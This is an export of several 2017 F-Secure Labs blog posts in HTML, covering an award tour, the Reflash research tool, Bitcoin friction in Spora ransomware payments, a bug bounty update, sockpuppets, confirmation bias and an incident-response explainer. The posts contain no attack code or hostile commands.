Taking Poika Out On The Town: 2017,"<p>AV-Test has <a href=""https://www.av-test.org/en/award/2016/best-protection-f-secure/"" target=""_blank"">awarded</a> F-Secure Client Security with Best Protection 2016! And as <a href=""https://www.f-secure.com/weblog/archives/00002503.html"">tradition dictates</a>, we took it on a tour of Helsinki.</p>
<div class=""wp-caption alignnone"" id=""attachment_2372"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/official-cathedral-shot-2017.jpg""><img alt=""official-cathedral-shot-2017"" class=""wp-image-2372 size-full"" height=""683"" src=""https://newsfromthelab.files.wordpress.com/2017/03/official-cathedral-shot-2017.jpg?w=1024&#038;h=683"" width=""1024"" /></a><p class=""wp-caption-text"">The traditional &#8220;poika at the cathedral&#8221; shot.</p></div>
<div class=""wp-caption alignnone"" id=""attachment_2374"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/poika-in-the-forest.jpg""><img alt=""poika-in-the-forest"" class=""wp-image-2374 size-full"" height=""576"" src=""https://newsfromthelab.files.wordpress.com/2017/03/poika-in-the-forest.jpg?w=1024&#038;h=576"" width=""1024"" /></a><p class=""wp-caption-text"">Poika in the woods.</p></div>
<div class=""wp-caption alignnone"" id=""attachment_2373"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/poika-at-the-lake.jpg""><img alt=""poika-at-the-lake"" class=""wp-image-2373 size-full"" height=""640"" src=""https://newsfromthelab.files.wordpress.com/2017/03/poika-at-the-lake.jpg?w=1024&#038;h=640"" width=""1024"" /></a><p class=""wp-caption-text"">Poika by the lake.</p></div>
<div class=""wp-caption alignnone"" id=""attachment_2376"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/poika-at-htc.jpg""><img alt=""poika-at-htc"" class=""wp-image-2376 size-full"" height=""768"" src=""https://newsfromthelab.files.wordpress.com/2017/03/poika-at-htc.jpg?w=1024&#038;h=768"" width=""1024"" /></a><p class=""wp-caption-text"">Poika in our newly renovated lobby.</p></div>
<div class=""wp-caption alignnone"" id=""attachment_2377"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/poika-with-cake.jpg""><img alt=""poika-with-cake"" class=""wp-image-2377 size-full"" height=""683"" src=""https://newsfromthelab.files.wordpress.com/2017/03/poika-with-cake.jpg?w=1024&#038;h=683"" width=""1024"" /></a><p class=""wp-caption-text"">Poika with cake.</p></div>
<div class=""wp-caption alignnone"" id=""attachment_2371"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/all-the-pojat.jpg""><img alt=""all-the-pojat"" class=""wp-image-2371 size-full"" height=""683"" src=""https://newsfromthelab.files.wordpress.com/2017/03/all-the-pojat.jpg?w=1024&#038;h=683"" width=""1024"" /></a><p class=""wp-caption-text"">All the pojat.</p></div>
<p>As a reminder, AV-Test&#8217;s Best Protection award is based on continuous real-world testing, over the entire year, against the most reliable and well-trusted endpoint protection vendors on the market. We&#8217;re proud to have, once again, been bestowed this award, and thank everyone involved in making this happen!</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/av-test/"">AV-Test</a>, <a href=""https://labsblog.f-secure.com/tags/poika/"">Poika</a>, <a href=""https://labsblog.f-secure.com/tags/testing/"">Testing</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2369&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/03/03/taking-poika-out-on-the-town-2017/
Reflash Flash Research Framework,"<p><a href=""https://labsblog.f-secure.com/author/turkja/"">Jarkko Turkulainen</a>, a Senior Researcher on our Threat Intelligence team, has (today!) publicly released a research tool called Reflash. It&#8217;s a <em>proof-of-concept</em> framework for analyzing Adobe Flash files. It produces an SQL database of Flash VM stack trace by injecting dynamically generated instrumentation to Flash files. The SQL database can later be analyzed with various tools.</p>
<p>Jarkko presented the tool at <a href=""http://avar2016.org/kla/"" target=""_blank"">AVAR 2016</a> and some people have asked about its availability. So… <a href=""https://github.com/f-secure/reflash"" target=""_blank"">here it is</a>, released as open source under a GPL-v3 license.</p>
<p>In the Reflash repository, there is also <a href=""https://newsfromthelab.files.wordpress.com/2017/02/reflash-practical-actionscript3-instrumentation.pdf"">a technical research paper</a> for those interested in the internals of the tool.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/reflash-practical-actionscript3-instrumentation-abstract.png""><img alt=""reflash-practical-actionscript3-instrumentation-abstract"" class=""alignnone wp-image-2358 size-full"" height=""503"" src=""https://newsfromthelab.files.wordpress.com/2017/02/reflash-practical-actionscript3-instrumentation-abstract.png?w=1024&#038;h=503"" style=""border: 1px solid #000000;"" width=""1024"" /></a></p>
<p>And Jarkko&#8217;s presentation, <a href=""https://newsfromthelab.files.wordpress.com/2017/02/avar-2016-reflash-whats-the-cve.pdf"">available here</a>, is helpful for those wanting to set up the tool.</p>
<div class=""wp-caption alignnone"" id=""attachment_2357"" style=""width: 1220px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/02/reflash-jarkko-turkulainen-avar-2016.png""><img alt=""reflash-jarkko-turkulainen-avar-2016"" class=""wp-image-2357 size-full"" height=""727"" src=""https://newsfromthelab.files.wordpress.com/2017/02/reflash-jarkko-turkulainen-avar-2016.png?w=1210&#038;h=727"" style=""border: 1px solid #000000;"" width=""1210"" /></a><p class=""wp-caption-text"">Jarkko presenting at AVAR 2016.</p></div>
<p>Share and enjoy.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/flash/"">Flash</a>, <a href=""https://labsblog.f-secure.com/tags/malware/"">Malware</a>, <a href=""https://labsblog.f-secure.com/tags/paper/"">Paper</a>, <a href=""https://labsblog.f-secure.com/tags/presentation/"">Presentation</a>, <a href=""https://labsblog.f-secure.com/tags/security-research/"">Security Research</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2359&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/02/23/reflash-flash-research-framework/
Bitcoin Friction Is Ransomware’s Only Constraint,"<p>In January 2017, I began tracking the &#8220;customer portal&#8221; of an innovative new family of crypto-ransomware called Spora. Among its innovations are a dedicated domain (spora.biz, spora.bz, et cetera) running a Tor web proxy, HTTPS support, an initially lower extortion demand, and tiered pricing with options to unencrypt individual files (up to 25Mb in size) rather than all.</p>
<p>Also part of the portal… a group chat function for support requests. Multiple conversations all strung together, making for a fascinating read overall.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/spora-public-communication.png""><img alt=""Spora.bz Public Communication"" class=""alignnone size-full wp-image-2348"" height=""814"" src=""https://newsfromthelab.files.wordpress.com/2017/02/spora-public-communication.png?w=606&#038;h=814"" width=""606"" /></a></p>
<p>Among recent conversations is a bit.ly link to a forum page on the site <a href=""https://www.bleepingcomputer.com/"" target=""_blank"">Bleeping Computer</a> where the “Spora Administrator” wanted reviews left, as evidence that paying the extortion results in unencrypted files.</p>
<p>The bulk of clicks, according to bit.ly statistics, occur on a Tuesday. FYI: running a cyber extortion scheme is a regularly scheduled job and spam runs go out on Tuesdays.</p>
<p>A great deal of the chat support issues revolve around one thing… Bitcoin.</p>
<blockquote><p>7: I dont have a bitcoin account yet and cant make it within 3 days, as you know.</p>
<p>Support: We removed all deadlines for you.</p></blockquote>
<p>Apparently “7” thinks it’s not so easy to setup a Bitcoin account “as you know”.</p>
<p>And here’s another practicality, many people exist in the cash economy.</p>
<blockquote><p>A: Admin, I dont know what checked the course means. It is hard to purchase bitcoins in the US I drove over 200 miles to purchase 500 worth, they took 10% you take 11% I had USD70 in a different wallet you took 11%, you have USD466 and I have no way to purchase more until tomorrow and will once again have to drive 200 mile to get them and get home. Please consider.</p>
<p>Support: No problem</p></blockquote>
<p>Many people don’t have the needed resources to buy Bitcoins online. Credit is required, and there are plenty of people with insufficient credit. For them, a physical Bitcoin ATM or “brick-and-mortar” retailer is required.</p>
<p>We should be thankful that there are at least some limits on purchasing Bitcoin. If it were any easier to do so, very little else would check the growth of crypto-ransomware’s business model. The malware technology to encrypt data has been possible for many, many years; the bigger challenge has always been getting paid.</p>
<p>In the past, cyber crime schemes (such as scareware) have been killed off by disrupting the money supply. The same may well be true of cyber extortion; to kill the business model, it may be necessary to ban Bitcoin.</p>
<hr />
<p>This article was originally published in our <a href=""http://www.f-secure.com/cyber-security-report-2017"">State of Cyber Security 2017</a> report.</p>
<p>Now available! <a href=""https://newsfromthelab.files.wordpress.com/2017/02/bitcoin-friction-is-ransomwares-only-constraint-f-secure-socs-2017-supplemental-appendix.pdf"">A new supplemental appendix</a> which includes 34 pages (more than 20,000 words) of Spora &#8220;tech support&#8221; chats.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/crypto/"">Crypto</a>, <a href=""https://labsblog.f-secure.com/tags/malware/"">Malware</a>, <a href=""https://labsblog.f-secure.com/tags/ransomware/"">Ransomware</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/threat-report/"">Threat Report</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2349&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/02/22/bitcoin-friction-is-ransomwares-only-constraint/
F-Secure Does Cyber Security,"<p>For more than 10 years, we&#8217;ve released an annual report/summary featuring observations, research, and malware trends. <a href=""https://www.f-secure.com/en/web/labs_global/whitepapers#threatreport"">And in past years</a>, this publication has included the word &#8220;threat&#8221; in its title. But no more! There are rather significant changes this year in our… <strong>State of Cyber Security.</strong></p>
<div class=""wp-caption alignnone"" id=""attachment_2343"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/02/state_of_cyber_security_cover.png""><img alt=""State Of Cyber Security 2017"" class=""wp-image-2343 size-full"" height=""722"" src=""https://newsfromthelab.files.wordpress.com/2017/02/state_of_cyber_security_cover.png?w=1024&#038;h=722"" width=""1024"" /></a><p class=""wp-caption-text""><a href=""http://www.f-secure.com/cyber-security-report-2017"">Full of cyber</a></p></div>
<p>The new title reflects a change in the type of content you can expect to read in the report. Although we still have portions devoted to this year&#8217;s malware landscape, the report is largely focused on cyber security at large and stories from the field.</p>
<p>In my <a href=""https://labsblog.f-secure.com/2017/02/08/f-secure-does-red-teaming/"">previous post</a>, I mentioned we&#8217;d be making a lot more noise about the work of our <a href=""https://css.f-secure.com/"">Cyber Security Services</a> division. This report is one of the steps we&#8217;ve made in that direction. And another nice change you&#8217;ll notice is that this year&#8217;s report includes several contributed articles from some of our friends and partners.</p>
<p>This report took a lot of hard work to put together, but my colleagues and I had fun creating it. We hope you have just as much fun reading it!</p>
<p>Finally… <a href=""http://www.f-secure.com/cyber-security-report-2017"">here&#8217;s a link to the report</a>.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/incident-response/"">Incident Response</a>, <a href=""https://labsblog.f-secure.com/tags/malware/"">Malware</a>, <a href=""https://labsblog.f-secure.com/tags/statistics/"">Statistics</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/threat-report/"">Threat Report</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2338&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/02/15/f-secure-does-cyber-security/
“F-Secure does red teaming?”,"<p>On June 2nd 2015, F-Secure announced via a <a href=""https://www.f-secure.com/en/web/press_global/news/news-archive/-/journal_content/56/1075444/1248534?p_p_auth=p5CiaQD2&amp;refererPlid=910425"">press release</a> its acquisition of the Danish Cyber Security firm, nSense. That press release contained the following snippet:</p>
<p>&#8220;<em>the combined portfolio will allow F-Secure to provide top-tier incident response and forensic expertise, comprehensive vulnerability assessment, and threat intelligence and security management services to enterprises and businesses with critical IT infrastructure.</em>&#8221;</p>
<p>Last week, we released a new brand video. See below.</p>
<p></p>
<p>In response to the video, we started to see some interesting (and in some cases flattering) comments on Twitter.</p>
<div class=""embed-twitter"">
<blockquote class=""twitter-tweet"">
<p dir=""ltr"" lang=""en""><a href=""https://twitter.com/mikko"">@mikko</a> Is this an episode of Mr. Robot I missed?</p>
<p>&mdash; David (@NewCityofGold) <a href=""https://twitter.com/NewCityofGold/status/828702101354078208"">February 6, 2017</a></p></blockquote>
<p></div>
<div class=""embed-twitter"">
<blockquote class=""twitter-tweet"">
<p dir=""ltr"" lang=""en""><a href=""https://twitter.com/mikko"">@mikko</a> It's better than <a href=""https://twitter.com/whoismrrobot"">@whoismrrobot</a> :). Screenwriters would &quot;kill&quot; for your knowledge and experience.</p>
<p>&mdash; Angelina Kontini ♕ (@ankontini) <a href=""https://twitter.com/ankontini/status/828634077767012353"">February 6, 2017</a></p></blockquote>
<p></div>
<div class=""embed-twitter"">
<blockquote class=""twitter-tweet"">
<p dir=""ltr"" lang=""en""><a href=""https://twitter.com/FSecure"">@FSecure</a> <a href=""https://twitter.com/mikko"">@mikko</a> fsecure does red teaming?</p>
<p>&mdash; Dan Tentler (@Viss) <a href=""https://twitter.com/Viss/status/828515132573569028"">February 6, 2017</a></p></blockquote>
<p></div>
<p>(See the thread <a href=""https://twitter.com/FSecure/status/827473813419995141"" target=""_blank"">here</a>.)</p>
<p>Yes, F-Secure really has been doing red teaming since June 2015 (and nSense well before that). And incident response, digital forensics, risk assessments, penetration testing, fuzz testing, vulnerability assessments, software security consulting, and a whole bunch of other things is now something that F-Secure does. We possibly didn&#8217;t make enough noise about that fact. Expect that to change this year!</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/digital-forensics/"">Digital Forensics</a>, <a href=""https://labsblog.f-secure.com/tags/incident-response/"">Incident Response</a>, <a href=""https://labsblog.f-secure.com/tags/penetration-testing/"">Penetration Testing</a>, <a href=""https://labsblog.f-secure.com/tags/red-team/"">Red Team</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/vulnerability-assessments/"">Vulnerability Assessments</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2330&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/02/08/f-secure-does-red-teaming/
Noun: Confirmation Bias,"<p>Confirmation bias, according to Google, is &#8220;the tendency to interpret new evidence as confirmation of one&#8217;s existing beliefs or theories.&#8221;</p>
<div class=""wp-caption alignnone"" id=""attachment_2317"" style=""width: 644px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/02/confirmation-bias-definition.png""><img alt=""Confirmation Bias Definition"" class=""wp-image-2317 size-full"" height=""175"" src=""https://newsfromthelab.files.wordpress.com/2017/02/confirmation-bias-definition.png?w=634&#038;h=175"" style=""border: 1px solid #000000;"" width=""634"" /></a><p class=""wp-caption-text"">noun: <a href=""https://www.google.com/#q=confirmation+bias+definition"" target=""_blank"">confirmation bias</a></p></div>
<p>Technology… potentially opens up a vast new realm of evidence, and that, if not very carefully analyzed, risks feeding <a href=""https://en.wikipedia.org/wiki/Confirmation_bias"" target=""_blank"">confirmation bias</a>.</p>
<p>Last Friday, <a href=""http://www.journal-news.com/news/data-from-man-pacemaker-led-arson-charges/sDp2XXGPY1EKJkY57sureP/"" target=""_blank"">Journal News reported</a> that a man from Middletown, Ohio was charged with the crime of arson, in part due to data from his artificial heart implant.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/pacemaker-case-1.png""><img alt=""Data from man’s pacemaker led to arson charges"" class=""alignnone wp-image-2318 size-full"" height=""170"" src=""https://newsfromthelab.files.wordpress.com/2017/02/pacemaker-case-1.png?w=790&#038;h=170"" style=""border: 1px solid #000000;"" width=""790"" /></a></p>
<p>Artificial heart implant? Get the data!</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/pacemaker-case-2.png""><img alt=""Data from man’s pacemaker led to arson charges"" class=""alignnone wp-image-2319 size-full"" height=""130"" src=""https://newsfromthelab.files.wordpress.com/2017/02/pacemaker-case-2.png?w=790&#038;h=130"" style=""border: 1px solid #000000;"" width=""790"" /></a></p>
<p>But… only asking one professional to analyze the data?</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/pacemaker-case-3.png""><img alt=""Data from man’s pacemaker led to arson charges"" class=""alignnone wp-image-2320 size-full"" height=""110"" src=""https://newsfromthelab.files.wordpress.com/2017/02/pacemaker-case-3.png?w=790&#038;h=110"" style=""border: 1px solid #000000;"" width=""790"" /></a></p>
<p>That runs a high risk of confirmation bias.</p>
<p>Arson investigations unfortunately utilize a lot of pseudoscience and assumptions.</p>
<p>There&#8217;s <a href=""http://www.pbs.org/wgbh/pages/frontline/death-by-fire/etc/transcript.html"" target=""_blank"">a case from Texas</a> in which the prosecutor&#8217;s theory focused on a pentagram.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/heavy-metal-evidence-1.png""><img alt=""Death By Fire"" class=""alignnone wp-image-2321 size-full"" height=""200"" src=""https://newsfromthelab.files.wordpress.com/2017/02/heavy-metal-evidence-1.png?w=530&#038;h=200"" style=""border: 1px solid #000000;"" width=""530"" /></a></p>
<p>It was just an Iron Maiden poster.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/02/heavy-metal-evidence-2.png""><img alt=""Death By Fire"" class=""alignnone wp-image-2322 size-full"" height=""150"" src=""https://newsfromthelab.files.wordpress.com/2017/02/heavy-metal-evidence-2.png?w=530&#038;h=150"" style=""border: 1px solid #000000;"" width=""530"" /></a></p>
<p>Evidence of nothing.</p>
<p>Perhaps the heart implant / pacemaker data actually supports law enforcement&#8217;s theory. But perhaps not. Time will tell.</p>
<p>What do we know now?</p>
<p>I know that I can predict this story will stoke fears of our data being used against us. In a age in which multitudes of people are wearing fitness trackers and smart watches tracking their heart rates, how can it not?</p>
<p>But it&#8217;s not data we should fear, it&#8217;s the humans &#8220;interpreting&#8221; it.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/data/"">Data</a>, <a href=""https://labsblog.f-secure.com/tags/definition/"">Definition</a>, <a href=""https://labsblog.f-secure.com/tags/privacy/"">Privacy</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2323&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/02/01/noun-confirmation-bias/
Noun: Sockpuppet,"<p>An Internet <a href=""https://en.wikipedia.org/wiki/Sockpuppet_(Internet)"" target=""_blank"">sockpuppet</a>, according to Google, is &#8220;a false online identity, typically created by a person or group in order to promote their own opinions or views.&#8221;</p>
<div class=""wp-caption alignnone"" id=""attachment_2304"" style=""width: 644px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/01/sockpuppet-definition.png""><img alt=""Sockpuppet: a false online identity, typically created by a person or group in order to promote their own opinions or views."" class=""size-full wp-image-2304"" height=""233"" src=""https://newsfromthelab.files.wordpress.com/2017/01/sockpuppet-definition.png?w=634&#038;h=233"" width=""634"" /></a><p class=""wp-caption-text"">noun: <a href=""https://www.google.com/#q=sockpuppet+definition"" target=""_blank"">sockpuppet</a></p></div>
<p>Sockpuppets are nothing particularly new… they go back as far as USENET. But it feels that recently, sockpuppetry has reached new heights.</p>
<p>Twitter is an easy place to find multiple examples…</p>
<div class=""wp-caption alignnone"" id=""attachment_2301"" style=""width: 510px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/01/september-2016-sockpuppets.gif""><img alt=""Russian language sockpuppets"" class=""wp-image-2301 size-full"" height=""500"" src=""https://newsfromthelab.files.wordpress.com/2017/01/september-2016-sockpuppets.gif?w=500&#038;h=500"" style=""border: 1px solid #000000;"" width=""500"" /></a><p class=""wp-caption-text"">&#8220;Joined September 2016&#8221;</p></div>
<p>And so I&#8217;ve created a list of &#8220;<a href=""https://twitter.com/5ean5ullivan/lists/sept-16-sockpuppets1"" target=""_blank"">September &#8217;16 sockpuppets</a>&#8221; – 80 related accounts.</p>
<p>Take a look (down the rabbit hole) and see for yourself. Enjoy!</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/disinformation/"">Disinformation</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/twitter/"">Twitter</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2302&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/01/16/noun-sockpuppet/
F-Secure Vulnerability Reward Program Update,"<p>A message from Calvin, a security vulnerability expert and member of our Anti-Malware Unit. The AMU team has a customer care/support focus.</p>
<hr />
<p>Happy New Year to all you readers out there! A year has passed since we launched our <a href=""https://www.f-secure.com/en/web/labs_global/vulnerability-reward-program"">F-Secure Vulnerability Reward Program</a> (bug bounty) and time really flies. Here&#8217;s a snapshot of what we&#8217;ve seen in 2016:</p>
<ul>
<li>We had close to 60 unique submissions.</li>
<li>We rewarded almost €30,000 for 35 reports in total.</li>
<li>We rewarded €5,000 for one critical vulnerability.</li>
<li>We released <a href=""https://www.f-secure.com/en/web/labs_global/security-advisories"">two security advisories</a> as a result of the submissions received.</li>
</ul>
<p>The reports submitted during the past year have proven to be very useful to us. We have seen some interesting exploitation tricks and our development team has made use of the information to further improve our internal process. Not forgetting, we have a <a href=""https://www.f-secure.com/en/web/labs_global/vrp-hall-of-fame"">Hall of Fame</a> page thanking all the researchers who helped make our products better.</p>
<p>On the other hand, we realized, being new to this, that we are not perfect and some mistakes were made. For that, we apologize and ask for forgiveness. We have learned from it and here is an update on what to expect in 2017:</p>
<ul>
<li>Our program is now extended for another year, ending on 31st December 2017.</li>
<li>We are now promising an acknowledgement email within 5 business days upon receiving your report. We will also provide a progress update email within 10 business days after our last contact with you.</li>
<li>We are working on listing a payment table so that you can have a better overview of our reward level. Stay tuned to our program page.</li>
<li>We are also working on defining what we at F-Secure consider as quality report, and this too will be updated in our program page.</li>
</ul>
<p>We thank you for your continuous research and for helping us keep our users secure. Click <a href=""https://www.f-secure.com/en/web/labs_global/vulnerability-reward-program"">here</a> for the complete rules. Happy bug hunting!</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/security-research/"">Security Research</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/vulnerability/"">Vulnerability</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2292&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/01/10/f-secure-vulnerability-reward-program-update/
"What’s The Deal With Digital Forensics, Incident Response, And Attribution?","<p>After several high-profile cyber attacks made big news headlines this year, it&#8217;s become evident to me, through online commentary, that there&#8217;s some confusion in the public space about how incident response services are utilized, how attribution is performed, and how law enforcement&#8217;s role fits into cyber crime investigations. I&#8217;m hoping this article helps to clear things up and answer some of the most frequent questions I&#8217;ve been getting.</p>
<div class=""embed-twitter"">
<blockquote class=""twitter-tweet"">
<p dir=""ltr"" lang=""en""><a href=""https://twitter.com/5ean5ullivan"">@5ean5ullivan</a> <a href=""https://twitter.com/theintercept"">@theintercept</a> I've heard it's so common there's even an entire industry built around it.</p>
<p>&mdash; the grugq (@thegrugq) <a href=""https://twitter.com/thegrugq/status/809754376080211969"">December 16, 2016</a></p></blockquote>
<p></div>
<p>Cyber crime investigations are similar in nature to fraud and financial crime investigations. Nowadays a great deal of financial crimes are, in fact, cyber crimes. Cyber crimes, just like financial crimes, are frequently difficult to spot.</p>
<p>In the case of financial crimes, it might take something like a quarterly financial audit to reveal that something suspect is going on. Some cyber crimes are subtle like this, too. For instance, in the case of a hidden attacker maintaining persistence on a corporate network for purposes of long-term data exfiltration, the intrusion might only be revealed during a network sweep, as part of periodic threat assessment process, or via a newly installed intrusion detection system.  Not all cyber crimes are difficult to spot. Some cyber crimes reveal themselves as part of the operation – an attacker will contact the victim organization and will attempt to extort a ransom, or an attacker will leak data to the public, and the victim company will find out about it.</p>
<p>It&#8217;s interesting to note that several high-profile breaches during the past few years were discovered when a cyber security vendor installed their technology stack on the victim&#8217;s network as part of a pre-sales demo or trial period.</p>
<p>Regardless of how it&#8217;s discovered, once a company suspects that they&#8217;re the victim of a financial or cyber crime, they&#8217;ll need to collect additional evidence before involving law enforcement. Once an investigation is initiated, a variety of third party auditors are usually brought in to help. In the case of suspected fraud or financial crime, insurance companies can provide some of those services. In the case of a cyber crime, a cyber security firm specialized in digital forensics and incident response will be called in.</p>
<p>The victim organization pays for such services out of their own pocket. Why? Because incident response isn&#8217;t just about forensics. It&#8217;s about cleaning up affected systems, restoring the network to a non-compromised state, restoring lost data, and often it&#8217;s also about providing assistance to the victim organization in adjusting security practices and risk management plans to avoid future incidents. As part of the incident response process, law enforcement are involved once enough evidence has been collected to determine when and how the crime was committed.</p>
<p>Once involved, law enforcement agencies utilize the forensic data collected by privately-run incident response operations as a starting point for their own investigations. Remember that the police have access to additional sources of evidence that private investigators don&#8217;t. For instance, law enforcement agencies can subpoena logs from additional private sources (such as Internet Service Providers), and can correlate data from other investigations they&#8217;ve run. In our experience, law enforcement will often continue to cooperate with third party first-responders during an ongoing criminal investigation.</p>
<div class=""wp-caption alignnone"" id=""attachment_2270"" style=""width: 501px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/12/cyber-attribution-dice.jpg""><img alt=""Cyber Attribution Dice"" class=""size-full wp-image-2270"" height=""221"" src=""https://newsfromthelab.files.wordpress.com/2016/12/cyber-attribution-dice.jpg?w=491&#038;h=221"" width=""491"" /></a><p class=""wp-caption-text"">You can also determine cyber attribution with this handy set of dice. (Source: <a href=""https://www.etsy.com"" target=""_blank"">https://www.etsy.com</a>)</p></div>
<p>Attribution is more of an art than a science. When it comes to cyber crimes, private incident responders perform educated guesswork. This usually involves correlating the tactics, techniques, and procedures (TTPs) found at the crime scene with previous casework or open source threat intelligence. This guesswork includes analyzing samples, such as custom tools or malware, found at the scene, language and content patterns found in phishing emails, the locations of C&amp;C servers and phishing sites, techniques used for persistence or lateral movement, IP addresses associated with the attacks, and any other metadata uncovered during the investigation. The motives of suspected criminal groups may also factor into attribution guesswork. It&#8217;s not uncommon for private cyber security companies to work with law enforcement when determining attribution. However, due to the confidential nature of ongoing law enforcement work, evidence collected by or provided by law enforcement agencies isn&#8217;t normally made public as part of a third-party&#8217;s attribution conclusions.</p>
<p>There are a lot fewer cyber security companies in the world than there are insurance and financial services companies. Because of that, the demand for cyber security services companies is high. So high, in fact, that security-conscious organizations will often pay a yearly fee to keep a cyber security firm on retainer. By doing this, they ensure that help will be at hand as soon as an incident happens, and that prices for incident response work are charged at agreed upon rates. This is not unlike keeping law firms or financial services firms on retainer (for emergencies) or having certain special corporate agreements with insurance partners in place. Organizations that don&#8217;t have a cyber security firm on retainer typically have difficulty securing incident response and forensics services when they&#8217;re needed, and may end up paying rather high prices when they finally find someone who can help.</p>
<p>Incident response work isn&#8217;t just about reacting to breaches and cyber crimes. Companies are now able to purchase cyber insurance policies. Here&#8217;s how forensics work comes into play in the case of an insurance settlement related to a cyber security incident. Insurance firms employ claims adjusters whose job it is to investigate insurance claims and determine the extent of a company&#8217;s liability when the claim is filed. In a traditional sense, claims adjusters gather data in a variety of ways, including interviewing claimants and witnesses, consulting police and hospital records and inspecting property damage. In the case of a cyber crime, cyber claims adjusters, are brought in to run forensics in a similar way to how incident response is carried out. Compensation is awarded to the claimant based on the findings of the cyber claims adjuster. If the cyber claims adjuster were to, for instance, determine that a network was breached via a known vulnerability that should have been patched long ago, the claimant may receive a low amount of compensation. This is completely analogous to how an individual claimant would receive a low amount of compensation if they were burgled and it was later determined that they&#8217;d left their front door open.</p>
<p>With cyber security incidents becoming more and more widespread, businesses are learning that they need to adapt. This includes setting aside budget to keep cyber security services on retainer, paying for periodic trainings, threat assessments, and risk assessments, and even bringing experts onto their payroll to properly manage their cyber security practices. The cost of not taking cyber security seriously today is akin to the cost of not having your business properly insured. And yet there are plenty of businesses out there who don&#8217;t think they&#8217;ll become the victim of the next breach, and who clearly don&#8217;t take these costs into account. And they&#8217;re most likely going to end up paying through the nose in the long term.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/attribution/"">Attribution</a>, <a href=""https://labsblog.f-secure.com/tags/crime/"">Crime</a>, <a href=""https://labsblog.f-secure.com/tags/dfir/"">DFIR</a>, <a href=""https://labsblog.f-secure.com/tags/explainer/"">Explainer</a>, <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2264&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" 